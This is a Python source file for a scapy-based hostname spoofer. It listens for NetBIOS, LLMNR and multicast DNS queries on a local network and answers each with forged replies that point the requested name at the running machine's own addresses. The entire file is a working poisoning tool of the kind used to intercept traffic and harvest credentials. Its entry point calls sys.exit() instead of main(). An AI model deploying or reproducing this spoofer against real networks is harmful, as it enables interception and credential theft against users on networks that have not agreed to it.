#!/usr/bin/env python
# -*- coding: utf-8 -*-

""" This package implement a Hostname Spoofer (Netbios, LLMNR, DNS Local). """

###################
#    This package implement a Hostname Spoofer (Netbios, LLMNR, DNS Local).
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

from scapy.all import (
    NBNSQueryRequest,
    LLMNRQuery,
    LLMNRResponse,
    DNS,
    DNSQR,
    DNSRR,
    Raw,
    send,
    sniff,
    IP,
    IPv6,
    UDP,
    get_if_hwaddr,
    get_if_addr,
    get_if_addr6,
    conf,
)
from threading import Thread
import logging, sys

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s : %(message)s",
    datefmt="%m/%d/%Y %I:%M:%S %p",
)


class NetbiosSpoof:

    """ This class implement the netbios spoofer. """

    def __init__(self):
        self.MAC = get_if_hwaddr(conf.iface)
        self.IP = get_if_addr(conf.iface)
        self.IPv6_1 = get_if_addr6(conf.iface)
        self.IPv6_2 = conf.route6.route()[1]
        self.IPv6_3 = "fe80::" + ":".join(self.IPv6_1.split(":")[-4:])
        self.RAW_IP = bytes([int(number) for number in self.IP.split(".")])
        self.run = True

    def response_NBNS(self, packet):

        """ This function build the Netbios Response. """

        return (
            [
                IP(ihl=5, proto=17, dst=packet[IP].src)
                / UDP(sport=137, dport=137)
                / NBNSQueryRequest(
                    NAME_TRN_ID=packet[NBNSQueryRequest].NAME_TRN_ID,
                    FLAGS=34048,
                    QDCOUNT=0,
                    ANCOUNT=1,
                    QUESTION_NAME=packet[NBNSQueryRequest].QUESTION_NAME,
                )
                / Raw(load=b"\x00\x04\x93\xe0\x00\x06\x00\x00" + self.RAW_IP)
            ],
            packet[IP].src,
            packet[NBNSQueryRequest].QUESTION_NAME,
            "NBT-NS",
        )

    def response_LLMNR(self, packet):
        """ This function implement the LLMNR Response. """

        if packet.haslayer(IP):
            if packet[DNSQR].qtype == 28:
                return (
                    [
                        IP(ihl=5, proto=17, dst=packet[IP].src)
                        / UDP(sport=5355, dport=packet[UDP].sport)
                        / LLMNRResponse(
                            id=packet[LLMNRQuery].id,
                            qdcount=1,
                            ancount=2,
                            qd=DNSQR(qname=packet[DNSQR].qname, qtype=28),
                            an=DNSRR(
                                rrname=packet[DNSQR].qname,
                                ttl=30,
                                type=28,
                                rdata=self.IPv6_1,
                            )
                            / DNSRR(
                                rrname=packet[DNSQR].qname,
                                ttl=30,
                                type=28,
                                rdata=self.IPv6_3,
                            ),
                        )
                    ],
                    packet[IP].src,
                    packet[DNSQR].qname,
                    "LLMNR",
                )
            else:
                return (
                    [
                        IP(ihl=5, proto=17, dst=packet[IP].src)
                        / UDP(sport=5355, dport=packet[UDP].sport)
                        / LLMNRResponse(
                            id=packet[LLMNRQuery].id,
                            qdcount=1,
                            ancount=1,
                            qd=DNSQR(qname=packet[DNSQR].qname),
                            an=DNSRR(rrname=packet[DNSQR].qname, ttl=30, rdata=self.IP),
                        )
                    ],
                    packet[IP].src,
                    packet[DNSQR].qname,
                    "LLMNR",
                )
        elif packet.haslayer(IPv6):
            if packet[DNSQR].qtype == 28:
                return (
                    [
                        IPv6(dst=packet[IPv6].src)
                        / UDP(sport=5355, dport=packet[UDP].sport)
                        / LLMNRResponse(
                            id=packet[LLMNRQuery].id,
                            qdcount=1,
                            ancount=2,
                            qd=DNSQR(qname=packet[DNSQR].qname, qtype=28),
                            an=DNSRR(
                                ttl=30,
                                rrname=packet[DNSQR].qname,
                                type=28,
                                rdata=self.IPv6_1,
                            )
                            / DNSRR(
                                rrname=packet[DNSQR].qname,
                                type=28,
                                ttl=30,
                                rdata=self.IPv6_3,
                            ),
                        )
                    ],
                    packet[IPv6].src,
                    packet[DNSQR].qname,
                    "LLMNR",
                )
            else:
                return (
                    [
                        IPv6(dst=packet[IPv6].src)
                        / UDP(sport=5355, dport=packet[UDP].sport)
                        / LLMNRResponse(
                            id=packet[LLMNRQuery].id,
                            qdcount=1,
                            ancount=1,
                            qd=DNSQR(qname=packet[DNSQR].qname),
                            an=DNSRR(rrname=packet[DNSQR].qname, ttl=30, rdata=self.IP),
                        )
                    ],
                    packet[IPv6].src,
                    packet[DNSQR].qname,
                    "LLMNR",
                )

    def response_DNS(self, packet):
        """ This function implement the DNS Response. """

        if packet.haslayer(IP):
            return (
                [
                    IP(ihl=5, proto=17, dst="224.0.0.251")
                    / UDP(sport=5353, dport=5353)
                    / DNS(
                        qr=1,
                        aa=1,
                        rd=0,
                        ancount=3,
                        an=DNSRR(
                            ttl=30,
                            rrname=packet[DNSQR].qname,
                            type=28,
                            rdata=self.IPv6_1,
                        )
                        / DNSRR(
                            ttl=30,
                            rrname=packet[DNSQR].qname,
                            type=28,
                            rdata=self.IPv6_2,
                        )
                        / DNSRR(
                            rrname=packet[DNSQR].qname,
                            type=28,
                            ttl=30,
                            rdata=self.IPv6_3,
                        ),
                    ),
                    IP(ihl=5, proto=17, dst="224.0.0.251")
                    / UDP(sport=5353, dport=5353)
                    / DNS(
                        qr=1,
                        aa=1,
                        rd=0,
                        ancount=1,
                        an=DNSRR(ttl=30, rrname=packet[DNSQR].qname, rdata=self.IP),
                    ),
                ],
                packet[IP].src,
                packet[DNSQR].qname,
                "DNS",
            )
        elif packet.haslayer(IPv6):
            return (
                [
                    IPv6(dst="ff02::fb")
                    / UDP(sport=5353, dport=5353)
                    / DNS(
                        qr=1,
                        aa=1,
                        rd=0,
                        ancount=3,
                        an=DNSRR(
                            ttl=30,
                            rrname=packet[DNSQR].qname,
                            type=28,
                            rdata=self.IPv6_1,
                        )
                        / DNSRR(
                            ttl=30,
                            rrname=packet[DNSQR].qname,
                            type=28,
                            rdata=self.IPv6_2,
                        )
                        / DNSRR(
                            rrname=packet[DNSQR].qname,
                            type=28,
                            ttl=30,
                            rdata=self.IPv6_3,
                        ),
                    ),
                    IPv6(dst="ff02::fb")
                    / UDP(sport=5353, dport=5353)
                    / DNS(
                        qr=1,
                        aa=1,
                        rd=0,
                        ancount=1,
                        an=DNSRR(ttl=30, rrname=packet[DNSQR].qname, rdata=self.IP),
                    ),
                ],
                packet[IPv6].src,
                packet[DNSQR].qname,
                "DNS",
            )

    def identify_packet(self, packet):
        """ This function get the request type and send the response. """

        if packet.haslayer(NBNSQueryRequest) and packet[IP].src != self.IP:
            responses, ip_src, name, style = self.response_NBNS(packet)
        elif packet.haslayer(LLMNRQuery):
            responses, ip_src, name, style = self.response_LLMNR(packet)
        elif packet.haslayer(DNS) and packet.haslayer(DNSQR):
            responses, ip_src, name, style = self.response_DNS(packet)
        else:
            return None
        for response in responses:
            send(response, verbose=0)
        logging.debug(f"Style {style}, spoof {name} for {ip_src}")

    def stop(self):
        """ This function stop the sniffer. """

        self.run = False
        logging.info("Please wait...")

    def launch(self):
        """ This function launch the sniffer. """

        self.run = True
        logging.warning("Netbios spoofer is running...")
        while self.run:
            sniff(
                filter="(port 5353 or port 5355 or port 137) and proto UDP",
                count=1,
                prn=lambda packet: Thread(
                    target=self.identify_packet, args=(packet,)
                ).start(),
            )
        logging.warning("Netbios spoofer isn't running.")


def main():
    try:
        NetbiosSpoof().launch()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    sys.exit()
